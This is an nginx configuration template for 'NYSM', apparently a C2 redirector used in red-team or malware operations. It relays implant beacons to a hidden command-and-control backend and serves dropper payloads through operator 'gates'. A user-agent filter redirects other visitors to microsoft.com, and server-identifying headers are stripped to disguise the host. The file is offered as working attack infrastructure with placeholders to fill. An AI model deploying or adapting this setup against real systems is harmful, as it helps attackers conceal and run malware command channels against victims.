##
# NYSM - Nginx C2 Redirector Configuration
# Placeholders substituted by automate.sh:
#   <DOMAIN_NAME>     - FQDN for this redirector
#   <C2_SERVER>       - backend C2 in IP:Port format
#   <C2_SCHEME>       - http or https
#   <UA_PATTERN>      - regex passed to the user-agent filter (optional)
#   <PANEL_UPSTREAM>  - control plane (panel API + /g/ gates), host:port
#
# Dynamic include files (created empty by automate.sh, managed by the panel):
#   /etc/nginx/banlist.conf        - deny lines for operator-banned IPs
#   /etc/nginx/agent_routes.conf   - per-agent beacon location blocks
##

# ─── Structured 404 analytics (consumed asynchronously by the control plane) ─
map $status $log_404 {
    default 0;
    404     1;
}
log_format json_analytics escape=json '{'
    '"time":"$time_iso8601",'
    '"request_id":"$request_id",'
    '"method":"$request_method",'
    '"path":"$uri",'
    '"status":$status,'
    '"remote_addr":"$remote_addr",'
    '"user_agent":"$http_user_agent"'
'}';
access_log /var/log/nginx/access.json json_analytics if=$log_404;

# ─── IP Blocklist (populated by blocklist-update.sh) ─────────────────────────
include /etc/nginx/blocklist.conf;

# ─── Dynamic operator bans (written by the control plane) ────────────────────
include /etc/nginx/banlist.conf;

# ─── Rate limiting ────────────────────────────────────────────────────────────
limit_req_zone $binary_remote_addr zone=beacon:10m rate=10r/s;
# Gate traffic: validated beacon/dropper flows may transfer large payloads over
# multiple requests, so this zone is deliberately looser than the edge default.
limit_req_zone $binary_remote_addr zone=gate:10m rate=30r/s;

# ─── C2 upstream (with optional failover) ────────────────────────────────────
upstream c2_backend {
    server <C2_SERVER>;
    # Uncomment to add a hot-standby failover:
    # server <BACKUP_C2_SERVER> backup;
    keepalive 32;
}

# ─── Control plane upstream (panel API + release gates) ──────────────────────
upstream panel_backend {
    server <PANEL_UPSTREAM>;
    keepalive 16;
}

# ─── NYSM_HTTP_START ─────────────────────────────────────────────────────────
# HTTP - initial proxy block (pre-cert).
# automate.sh removes this entire section (between NYSM_HTTP_START and
# NYSM_HTTP_END) once the SSL certificate has been obtained, leaving only the
# redirect block and the HTTPS proxy block below.
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name <DOMAIN_NAME>;

    root  /var/www/html;
    index index.html index.htm;

    server_tokens off;

    #UA_FILTER# if ($http_user_agent !~* "<UA_PATTERN>") { return 301 https://www.microsoft.com; }

    # Release gates: operator-controlled URLs served by the control plane.
    # <GATE_BASE> and <AGENT_BASE> are substituted by automate.sh / the docker
    # entrypoint; start.sh randomizes them per deployment.
    location <GATE_BASE> {
        limit_req zone=gate burst=40 nodelay;

        proxy_pass         http://panel_backend;
        proxy_redirect     off;

        proxy_set_header   Host              $host;
        proxy_set_header   X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header   X-Real-IP         $remote_addr;

        proxy_read_timeout 120s;
        proxy_send_timeout 60s;

        proxy_hide_header  X-Powered-By;
        proxy_hide_header  Server;
        proxy_hide_header  Via;
    }

    # Agent channels: per-agent beacon routes (exact-match blocks are generated
    # by the control plane; unknown tokens fall through to a bare 404).
    include /etc/nginx/agent_routes.conf;
    location <AGENT_BASE> {
        return 404;
    }

    location / {
        try_files $uri $uri/ @c2;
    }

    location ~ \.php$ {
        try_files $uri @c2;
        fastcgi_pass  unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include       fastcgi_params;
    }

    location @c2 {
        limit_req zone=beacon burst=20 nodelay;

        proxy_pass         <C2_SCHEME>://c2_backend;
        proxy_redirect     off;
        proxy_ssl_verify   off;

        proxy_set_header   Host              $host;
        proxy_set_header   X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header   X-Real-IP         $remote_addr;

        proxy_connect_timeout  10s;
        proxy_read_timeout     90s;
        proxy_send_timeout     30s;

        proxy_hide_header  X-Powered-By;
        proxy_hide_header  Server;
        proxy_hide_header  Via;
        proxy_hide_header  X-Forwarded-Server;

        error_page 502 503 504 /maintenance.html;
    }

    location = /maintenance.html {
        root     /var/www/html;
        internal;
    }
}
# ─── NYSM_HTTP_END ───────────────────────────────────────────────────────────

